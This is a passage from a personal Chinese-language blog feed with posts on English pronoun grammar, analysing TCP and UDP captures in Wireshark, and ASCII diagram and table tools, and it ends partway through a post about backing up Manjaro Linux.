(<code>adj</code>)</th><th>名物代</th><th>反身代</th></tr></thead><tbody><tr><td>I</td><td>me</td><td>my</td><td>mine</td><td>myself</td></tr><tr><td>You</td><td>you</td><td>your</td><td>yours</td><td>yourself</td></tr><tr><td>He</td><td>him</td><td>his</td><td>his</td><td>himself</td></tr><tr><td>She</td><td>her</td><td>her</td><td>hers</td><td>herself</td></tr><tr><td>It</td><td>it</td><td>its</td><td>its</td><td>itself</td></tr><tr><td>We</td><td>us</td><td>our</td><td>ours</td><td>ourselves</td></tr><tr><td>You</td><td>you</td><td>your</td><td>yours</td><td>yourselves</td></tr><tr><td>They</td><td>them</td><td>their</td><td>theirs</td><td>themselves</td></tr></tbody></table><ul><li><p>主格做主语</p><p>eg(exempli gratia): <code>I</code> like English.</p></li><li><p>宾格做宾语或者表语</p><p>eg: I hate <code>him</code>.</p><p>It is <code>me</code>.</p></li><li><p>形物代</p><p>eg: This is <code>my book</code>.</p></li><li><p>名物代</p><p>This book is <code>mine</code>.</p></li><li><p>反身代</p><p>I love <code>myself</code>.</p><p>I love her.</p></li></ul><h3 id="2-指示代词"><a href="#2-指示代词" class="headerlink" title="2.指示代词"></a>2.指示代词</h3><p><strong>This(表示这)</strong></p><ul><li>This is a book.</li></ul><p><strong>That(表示那)</strong></p><ul><li>That is a book.</li></ul><p><strong>These(表示这些)</strong></p><ul><li>These are books.</li></ul><p><strong>Those(那些)</strong></p><ul><li>Those are books.</li></ul><p>That 和 Those 还有一些特殊的用法</p><p>that 还可以指代<code>可数单数，不可数名词</code></p><ul><li><code>The weather</code> of GuiZhou is cooler than <code>that</code> of GuangZhou.</li></ul><p>those 指代<code>可数复数</code></p><ul><li><code>The oranges</code> of GuiZhou are sweeter <code>than</code> those of GuangZhou.</li></ul><h3 id="3-不定代词"><a href="#3-不定代词" class="headerlink" title="3.不定代词"></a>3.不定代词</h3><p><strong>常用不定代词</strong></p><p>第一组: some,any(任何),every(每一个),each(每一个),no(没有)</p><p>第二组: both(两者都),either(两者之一),neither(两者都不),all(三者以上都),none(三者以上都不)</p><p>第三组: many,much,more(比较级，更多),most(最多)</p><p>第四组: little,a little,few,a few(有 a 表示肯定，还是有的)</p><p>第五组: other,others,another,the other,the others</p><p>第六组: half,several(几个)</p><p><strong>复合不定代词</strong></p><p>使用上面的代词与一些名词组合</p><table><thead><tr><th>every</th><th></th></tr></thead><tbody><tr><td>some</td><td>thing</td></tr><tr><td>any</td><td>one</td></tr><tr><td>no</td><td>body</td></tr></tbody></table><p>这就有了 12 种组合</p><h3 id="4-疑问代词"><a href="#4-疑问代词" class="headerlink" title="4.疑问代词"></a>4.疑问代词</h3><p><code>Who</code> is he?</p><p><code>What</code> do you want?</p><p>放在句首强调疑问</p><h2 id="数词"><a href="#数词" class="headerlink" title="数词"></a>数词</h2><h3 id="1-基数词"><a href="#1-基数词" class="headerlink" title="1. 基数词"></a>1. 基数词</h3><p>one,two,three…</p><p>细分的话还有<strong>整数，小数，分数，百分数</strong></p><p><strong>分数</strong></p><ul><li>分子用基数</li><li>分母用序数 (当分子&gt;1 时分母变复数),</li></ul><h3 id="2-序数词"><a href="#2-序数词" class="headerlink" title="2. 序数词"></a>2. 序数词</h3><p>first,second,third…</p><blockquote><p>名词短语，代词，数词都是<strong>笼统</strong>的 (一生来咀嚼？?)</p></blockquote><h2 id="不定式"><a href="#不定式" class="headerlink" title="不定式"></a>不定式</h2><p><strong>to+ 动词原型</strong>构成的短语，比如</p><ul><li>To learn English well.</li></ul><h2 id="动名词"><a href="#动名词" class="headerlink" title="动名词"></a>动名词</h2><p>比如 smoking</p><h2 id="句子"><a href="#句子" class="headerlink" title="句子"></a>句子</h2><p>如 You is a pig.</p><blockquote><p>不定式，动名词，句子的特点：</p><ul><li><p>作主语看作单数</p><p><code>To learn English well</code> is very important.</p></li><li><p>“头重脚轻”，使用 It 作形式主语/宾语</p><p><code>It</code> is very important <code>To learn English well</code></p><p>先说用处，再说主语</p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 名词 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用wireshark分析TCP、UDP</title>
      <link href="/TechnicalExperience/Network/TCP-UDP.html"/>
      <url>/TechnicalExperience/Network/TCP-UDP.html</url>
      
        <content type="html"><![CDATA[<p> 分析完理论知识后，不实践怎么知道是不是真的，wireshark就是一个非常方便的抓包工具，先用它来分析TCP和UDP</p><span id="more"></span><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Manjaro/Archlinux系统，安装指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -Ss wireshark</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>抓包涉及更高的权限，需要sudo使用</p><p>抓包界面</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wireshark-gui.png" alt=""></p><p>分为上中下三个窗口，最上面的窗口显示的是包的简略信息，中间是详细信息，下面是原始16进制数据。</p><h2 id="分析TCP"><a href="#分析TCP" class="headerlink" title="分析TCP"></a>分析TCP</h2><p>wireshark将SEQ设置为相对，为了方便观察，也就是从0开始，不适和新手了解TCP协议，需要在TCP简略包上右键鼠标–&gt;首选项–&gt;relative sequence number关闭</p><p>使用过滤器可以过滤其他不必要的协议<img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wireshark-filter.png" alt="wireshark-filter"></p><p>通过给http给服务器上传文件进行抓包得到以下界面</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wireshark-tcp.png" alt="wireshark-tcp-1"></p><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wireshark-tcp-1.png" alt="wireshark-tcp-1"></p><p>通过上图分析，我的计算机发送SYN标志tcp报文段，服务端回应了我SYN-ACK报文段，我的计算机回应ACK，三次握手建立连接完毕，然后开始发送数据（PSH表示不需要缓存，及时上交）。</p><ul><li>连接成功后的<strong>发送方和接收方的SEQ</strong>=上一次SEQ+Len</li></ul><p>此外我还发现了我的计算机发送的第一个tcp报文端的选项区</p><p><code>SACK_PERM=1 TSval=3007114814 TSecr=0 WS=128</code></p><ul><li><p>SACK表示<strong>选择性ACK</strong>，将提前到达的ACK序号放在这个字段，这样就避免了不必要的重传</p></li><li><p><strong>TSval</strong>(Timestamp value)和<strong>TSecr</strong>(Timestamp Echo Reply)都是32位的，发送方将当前时间填入TSval，接收方将当前时间填入TSecr，作用就是计算RTT(Round-Trip-Time)和防止回绕</p></li><li><p>WS（15位）用来扩大Win（16位），将Win扩大到31bit，<code>128</code>表示2的7次方，Win向左移动了7位</p></li></ul><p>我的数据包最后还有这样一段英文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[TCP segment of a reassembled PDU]</span><br></pre></td></tr></table></figure><p>它代表该TCP区段是属于上层（比如HTTP）协议的数据</p><blockquote><p><a href="https://luoguochun.cn/post/2016-09-23-tcp-fuck/#%E5%B0%8F%E7%BB%93">选项区参考</a></p></blockquote><h3 id="是否丢包"><a href="#是否丢包" class="headerlink" title="是否丢包"></a>是否丢包</h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wireshark-tcp-2.png" alt="wireshark-tcp-2"></p><p>打开序列/时间统计图，路径：<code>统计</code>–&gt;<code>TCP流图形</code>–&gt;<code>时间序列</code></p><p>观察到序列号都是上升的，说明没有丢包，丢包在抓包过程中也会有提示（TCP <strong>Retransmission</strong>）</p><h3 id="计算吞吐量"><a href="#计算吞吐量" class="headerlink" title="计算吞吐量"></a>计算吞吐量</h3><p>因为我使用HTTP协议进行传输数据，所以直接在http的post就能查看本次传输的相关信息</p><p>在TCP首选项里打开<code>calculate conversation timestamp</code></p><p>观察TCP层</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wireshark-conversation-timestamp.png" alt="wireshark-conversation-timestamp"><br>$$<br>吞吐量=153010bytes/1.885852617s=81135.714byte/s=79.2340964389k/s<br>$$</p><h3 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wireshark-tcp-over.png" alt="wireshark-tcp-over"></p><p>重抓了一遍，这里只考虑正常的释放过程，其他本人知识水平不够暂不研究</p><h2 id="分析UDP"><a href="#分析UDP" class="headerlink" title="分析UDP"></a>分析UDP</h2><p>QQ登录使用的就是<code>UDP</code>协议，它自己在应用层的协议是<code>OICQ</code></p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wireshark-udp-oicq.png" alt="wireshark-udp-oicq"></p><p>UDP报文段很简单，简单观察可以知道UDP有四个字段，每个字段占2字节，接下来分析UDP和IP的里面的长度是什么关系</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wireshark-udp-lenth.png" alt="wireshark-udp-lenth"></p><p>仅考虑IPv4</p><p>IP长度=IP头（20字节）+UDP头（8字节）+UDP数据</p><p>UDP长度=UDP头（8字节）+UDP数据</p><h3 id="有效负载"><a href="#有效负载" class="headerlink" title="有效负载"></a>有效负载</h3><p>length只有2byte=65536bit，所以有效负载=65536-8=65528字节</p><h3 id="发送与接收的端口关系"><a href="#发送与接收的端口关系" class="headerlink" title="发送与接收的端口关系"></a>发送与接收的端口关系</h3><p>发送者发送端口号在接收返回（响应）UDP 时候会变成接收端口号。<br>接收者发送返回（响应）UDP 时候接受端口号会变成发送端口号。</p>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
            <tag> UDP </tag>
            
            <tag> wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>asc字符图表、流程图，渲染代码图</title>
      <link href="/TechnicalExperience/Blog/asc-table.html"/>
      <url>/TechnicalExperience/Blog/asc-table.html</url>
      
        <content type="html"><![CDATA[<p>在绘制流程图等简单图形上面，打开图形绘制工具，画完保存，上传图床，复制链接（虽然typora简化了这些），但在看到某博客上面的一些使用asc，unicode字符做的图后，觉得很<del>牛逼</del>方便，于是便开始找工具制作。</p><span id="more"></span><p>先放几个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+---+     +---+     +---+</span><br><span class="line">| A | --&gt; | C | --&gt; | D |</span><br><span class="line">+---+     +---+     +---+</span><br><span class="line">            |</span><br><span class="line">            |</span><br><span class="line">            v</span><br><span class="line">          +---+</span><br><span class="line">          | E |</span><br><span class="line">          +---+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">               .................</span><br><span class="line">               v               :</span><br><span class="line">+------+     +---------+     +---------+     +---------+     +--------------+</span><br><span class="line">| Task | --&gt; | Created | --&gt; | Audit 1 | --&gt; | Audit 2 | --&gt; | Execute Task |</span><br><span class="line">+------+     +---------+     +---------+     +---------+     +--------------+</span><br><span class="line">               ^                               :</span><br><span class="line">               .................................</span><br></pre></td></tr></table></figure><p>优先显而易见，兼容性强，体积小。实现这些图的方式有两种</p><ol><li>手动绘制，怎么想就怎么画，不受限制。</li><li>写代码，使用工具渲染成其他格式（asc，html，avg）。代码复用性强</li></ol><h2 id="Graph-easy"><a href="#Graph-easy" class="headerlink" title="Graph easy"></a>Graph easy</h2><p>这是一个工具，需要掌握一些语法进行渲染</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在我的manjaro上，配置AUR源后，安装指令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yaourt -S perl-graph-easy</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>graph-easy 文本</code>即可，更多指令参见<code>graph-easy --help</code></p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul><li>简单语法</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文本内容</span></span><br><span class="line">[hello]-&gt;[world]</span><br><span class="line"><span class="comment"># 渲染图</span></span><br><span class="line">+-------+     +-------+</span><br><span class="line">| hello | --&gt; | world |</span><br><span class="line">+-------+     +-------+</span><br></pre></td></tr></table></figure><ul><li>复杂语法mer</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[ Client ]&#123;rows:8;&#125; -- (A) Authorizatoin Request --&gt; [ 1.Resource Owner ]&#123;rows:2;&#125;</span><br><span class="line">[ 1.Resource Owner ] -- (B) Authorizatoin Grant --&gt; [ Client ]</span><br><span class="line">[ Client ] -- (C) Authorizatoin Request --&gt; [ 2.Authorizatoin Server ]&#123;rows:2;&#125;</span><br><span class="line">[ 2.Authorizatoin Server ] -- (D) Access Token --&gt; [ Client ]</span><br><span class="line">[ Client ] -- (E) Access Token --&gt; [ 3.Resource Server ]&#123;rows:2;&#125;</span><br><span class="line">[ 3.Resource Server ] -- (F) Protected Resource --&gt; [ Client ]</span><br></pre></td></tr></table></figure><p>渲染后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">+--------+  (A) Authorizatoin Request   +------------------------+</span><br><span class="line">|        | ---------------------------&gt; |                        |</span><br><span class="line">|        |                              |    1.Resource Owner    |</span><br><span class="line">|        |  (B) Authorizatoin Grant     |                        |</span><br><span class="line">|        | &lt;--------------------------- |                        |</span><br><span class="line">|        |                              +------------------------+</span><br><span class="line">|        |  (C) Authorizatoin Request   +------------------------+</span><br><span class="line">|        | ---------------------------&gt; |                        |</span><br><span class="line">| Client |                              | 2.Authorizatoin Server |</span><br><span class="line">|        |  (D) Access Token            |                        |</span><br><span class="line">|        | &lt;--------------------------- |                        |</span><br><span class="line">|        |                              +------------------------+</span><br><span class="line">|        |  (E) Access Token            +------------------------+</span><br><span class="line">|        | ---------------------------&gt; |                        |</span><br><span class="line">|        |                              |   3.Resource Server    |</span><br><span class="line">|        |  (F) Protected Resource      |                        |</span><br><span class="line">|        | &lt;--------------------------- |                        |</span><br><span class="line">+--------+                              +------------------------+</span><br></pre></td></tr></table></figure><blockquote><p>更多的语法参见</p><p><a href="https://metacpan.org/pod/Graph::Easy#One-node">官网</a></p><p><a href="https://github.com/tiann/graph-easy-cn/blob/master/SUMMARY.md">部分翻译</a></p></blockquote><h2 id="mermaidmer"><a href="#mermaidmer" class="headerlink" title="mermaidmer"></a>mermaidmer</h2><p>mermaid把一些流程图片等简单图片简化成代码，我以前都是用工具制作成图片在上传图床使用，使用mermaid很明显是一个高效率的方法，但需要学习一点它的语法，typorta支持渲染，如果需要在博客上渲染的化需要安装hexo-filter-mermaid-diagrams插件，我的博客还不能渲染，但typora可以导出html</p><pre class="mermaid">gantt    dateFormat MM-DD    title 软件开发甘特图    section 设计    需求: done,des1, 01-06,01-08    原型: active,  des2, 01-09, 3d    UI设计: des3, after des2, 5d    未来任务: des4, after des3, 5d    section 开发    学习准备理解需求: crit, done, 01-06,24h    设计框架: crit, done, after des2, 2d    开发: crit, active, 3d    未来任务: crit, 5d    休息: 2d    section 测试    功能测试: active, a1, after des3, 3d    压力测试: after a1  , 20h    测试报告: 48h</pre><pre class="mermaid">graph TB         subgraph one         a1-->a2         end         subgraph two         b1-->b2         end         subgraph three         c1-->c2         end         c1-->a2</pre><h2 id="Drawit"><a href="#Drawit" class="headerlink" title="Drawit"></a>Drawit</h2><p>手绘工具，这是一个vim插件，<a href="https://github.com/vim-scripts/DrawIt">下载安装</a></p><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>\di 进入drawit模式</p><p>\ds 退出</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><table><thead><tr><th>按键和指令</th><th>作用</th></tr></thead><tbody><tr><td>left</td><td>向左绘制</td></tr><tr><td>right</td><td>向右绘制</td></tr><tr><td>up</td><td>向上绘制</td></tr><tr><td>down</td><td>向下绘制</td></tr><tr><td>h</td><td>左移动</td></tr><tr><td>j</td><td>下移动</td></tr><tr><td>k</td><td>上</td></tr><tr><td>l</td><td>右</td></tr><tr><td>space</td><td>橡皮擦模式</td></tr><tr><td>PD</td><td>右下绘制</td></tr><tr><td>PU</td><td>左下绘制</td></tr><tr><td>HOME</td><td>左上绘制</td></tr><tr><td>END</td><td>右上绘制</td></tr><tr><td>v,&lt;,&gt;,^</td><td>四个箭头</td></tr><tr><td>\v,\&lt;,\&gt;,^</td><td>四个粗箭头</td></tr><tr><td>crtl+v/鼠标拖动</td><td>进入visible模式</td></tr><tr><td>\l</td><td>在visible模式下，对选择块画线</td></tr><tr><td>\a</td><td>呈上，画带箭头的线</td></tr><tr><td>\b</td><td>对选择块画盒子</td></tr><tr><td>\e</td><td>对选择块画椭圆</td></tr><tr><td>\f 字符</td><td>以字符填充<strong>光标</strong>区域</td></tr><tr><td>\r 字符</td><td>以字符填充选择块填充</td></tr></tbody></table><p>下面是我乱画的，随意参考</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌─────────┐</span><br><span class="line">└─────────┘   |             ------------_-_</span><br><span class="line">              |                         \ /</span><br><span class="line">     +--------+                       X  | </span><br><span class="line">     |        |     +------+         / \ |</span><br><span class="line">     |        |-----|      |\       X   \|</span><br><span class="line">     +--------+     |      | \     / \   |</span><br><span class="line">                    +------+  \   /   \ /|</span><br><span class="line">                               \ /     X |</span><br><span class="line">                  \   X   X   / X        |</span><br><span class="line">                   \ / \ / \ / /         |                 --------------------------&gt;</span><br><span class="line">                    X   X   X /          |</span><br><span class="line">                          _ _            |</span><br><span class="line">                          \ /            |</span><br><span class="line">         +---+            _<span class="string">&#x27;_            |                          +------------+</span></span><br><span class="line"><span class="string">         |   |            \ /            |                          |333333333333|</span></span><br><span class="line"><span class="string">         |   |             &#x27;</span>            _|_                         |333333333333|</span><br><span class="line">         |   |                          \ /                         |333333333333|</span><br><span class="line">         |   ^-|----------+------___------                          |33333333333|</span><br><span class="line">         |                          \____                           +------------+</span><br><span class="line">         |                               \___                      </span><br><span class="line">     X   /---|&gt;----                          \____                 </span><br><span class="line">    X \ / /                                       \____            </span><br><span class="line">     \ X /                                             \___        </span><br><span class="line">      \ /                                                  \____   </span><br><span class="line">       X                                                        \__</span><br></pre></td></tr></table></figure><blockquote><p>参考文章<a href="https://www.digglife.net/articles/ascii-flowchart-how-to.html">如何制作纯 ASCII 文本流程图</a>                     </p></blockquote><h2 id="python-tabulate"><a href="#python-tabulate" class="headerlink" title="python-tabulate"></a>python-tabulate</h2><p>这是一个python的库，用来制作表格，markdown里估计用不到了，但若想将程序的数组输出表格可以用到它</p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tabulate</span><br></pre></td></tr></table></figure><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><p>支持传递的数据类型</p><ol><li>list of lists or another iterable of iterables</li><li>list or another iterable of dicts (keys as columns)</li><li>dict of iterables (keys as columns)</li><li>two-dimensional NumPy array</li><li>NumPy record arrays (names as columns)</li><li>pandas.DataFrame</li></ol><p>我使用列表做示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tabulate <span class="keyword">import</span> tabulate</span><br><span class="line"></span><br><span class="line">a = [[<span class="string">&#x27;a1&#x27;</span>,<span class="string">&#x27;a2&#x27;</span>],[<span class="string">&#x27;b1&#x27;</span>,<span class="string">&#x27;b2&#x27;</span>],[<span class="string">&#x27;c1&#x27;</span>,<span class="string">&#x27;c2&#x27;</span>]]</span><br></pre></td></tr></table></figure><ul><li>普通的打印</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(tabulate(a))</span><br><span class="line">--  --</span><br><span class="line">a1  a2</span><br><span class="line">b1  b2</span><br><span class="line">c1  c2</span><br><span class="line">--  --</span><br></pre></td></tr></table></figure><ul><li>可选参数<code>headers</code>，指定表格头部<ul><li>传递指定表头数据</li><li><code>firstrow</code>代表第一行为头部</li><li><code>keys</code>使用索引</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(tabulate(a,headers=<span class="string">&#x27;firstrow&#x27;</span>))</span><br><span class="line">a1    a2</span><br><span class="line">----  ----</span><br><span class="line">b1    b2</span><br><span class="line">c1    c2</span><br></pre></td></tr></table></figure><ul><li>可选参数<code>showindex</code>，代表行索引<ul><li>True</li><li>False</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(tabulate.tabulate(a,showindex=<span class="literal">True</span>))</span><br><span class="line">-  --  --</span><br><span class="line"><span class="number">0</span>  a1  a2</span><br><span class="line"><span class="number">1</span>  b1  b2</span><br><span class="line"><span class="number">2</span>  c1  c2</span><br><span class="line">-  --  --</span><br></pre></td></tr></table></figure><h3 id="表格样式"><a href="#表格样式" class="headerlink" title="表格样式"></a>表格样式</h3><ul><li>plain</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(tabulate.tabulate(a,tablefmt=<span class="string">&#x27;plain&#x27;</span>))</span><br><span class="line">a1  a2</span><br><span class="line">b1  b2</span><br><span class="line">c1  c2</span><br></pre></td></tr></table></figure><ul><li>simple（默认）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--  --</span><br><span class="line">a1  a2</span><br><span class="line">b1  b2</span><br><span class="line">c1  c2</span><br><span class="line">--  --</span><br></pre></td></tr></table></figure><ul><li>pretty</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----+----+</span><br><span class="line">| a1 | a2 |</span><br><span class="line">| b1 | b2 |</span><br><span class="line">| c1 | c2 |</span><br><span class="line">+----+----+</span><br></pre></td></tr></table></figure><ul><li>pipe</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|:---|:---|</span><br><span class="line">| a1 | a2 |</span><br><span class="line">| b1 | b2 |</span><br><span class="line">| c1 | c2 |</span><br></pre></td></tr></table></figure><ul><li>github</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|----|----|</span><br><span class="line">| a1 | a2 |</span><br><span class="line">| b1 | b2 |</span><br><span class="line">| c1 | c2 |</span><br></pre></td></tr></table></figure><ul><li>grid</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----+----+</span><br><span class="line">| a1 | a2 |</span><br><span class="line">+----+----+</span><br><span class="line">| b1 | b2 |</span><br><span class="line">+----+----+</span><br><span class="line">| c1 | c2 |</span><br><span class="line">+----+----+</span><br></pre></td></tr></table></figure><ul><li>fancy_grid</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">╒════╤════╕</span><br><span class="line">│ a1 │ a2 │</span><br><span class="line">├────┼────┤</span><br><span class="line">│ b1 │ b2 │</span><br><span class="line">├────┼────┤</span><br><span class="line">│ c1 │ c2 │</span><br><span class="line">╘════╧════╛</span><br></pre></td></tr></table></figure><blockquote><p>更多方法参考官方](<a href="https://pypi.org/project/tabulate/">https://pypi.org/project/tabulate/</a>)</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Graph-easy毕竟有点老，好久没更新了，为了画asc图掌握语法实在有点费力，没什么特殊需求不建议使用，绘制普通asc流程图我还是建议使用手绘，asc图表建议使用python库，若想绘制精致一点的流程图，时序图，干特图我选择mermaid。</p>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> 博客 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>备份Manjaro</title>
      <link href="/TechnicalExperience/Linux/backup-tablet.html"/>
      <url>/TechnicalExperience/Linux/backup-tablet.html</url>
      
        <content type="html"><![CDATA[<p>在256G的平板电脑装双系统，使用因为第一次使用linux时觉得70G够用（源自于学习只装40G的自信），所以在电脑上的格局是win系统60G，win软件110G，linux根目录30G，/home30G.</p><span id="more"></span><p>没错，和我想的一样，在不打游戏的linux上个人做点小事确实是够用了，空间还很充足（余个10G左右），but，我发现了百度云命令行版，于是想把系统备份一下（作为一个过来人，备份很重要，要不是因为电脑空间小，才不会使用百度云）</p><p>为了备份/home25G，/usr15G这两个空间大户，使用了压缩效率非常棒的xz格式压缩，而且分开压缩，分开上传。</p><blockquote><p>xz压缩率是真的棒，就是花的时间有点久</p><p>/home 25G –&gt; 12G</p><p>/usr 17G –&gt; 4.45G</p></blockquote><p>我删了很多大型IDE，如eclipse，IDEA，pycharm等等，使用软件管理器卸载，结果我发现了一点不对经。。。你猜怎么着，打不开应用列表、添加不了桌面配件等等有关桌面的问题产生了，虽然吧在linux上桌面没了也不要紧，还有命令行嘛，但是，没桌面怎么<del>看小姐姐</del>看视频学习，所以我去查看pacman日志到底是删了哪些重要的东西。</p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/Emoticons/emo5.jpg" style="zoom:50%;" /><p>看了半天，嗯～噢～，我发现我没看懂到底是哪个软件的问题，然后重启吧，发现网络也出问题了（大哭）。</p><p>我就这么废了半天去找是哪个软件的问题，最终我发现，还是重装吧，不过不是系统重装（作为一个垃圾程序员，不到万不得已是不会重装的），而是重新装一下桌面。</p><p>没网怎么装，USB连接手机就有了。</p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/Emoticons/emo2.jpeg" style="zoom:50%;" 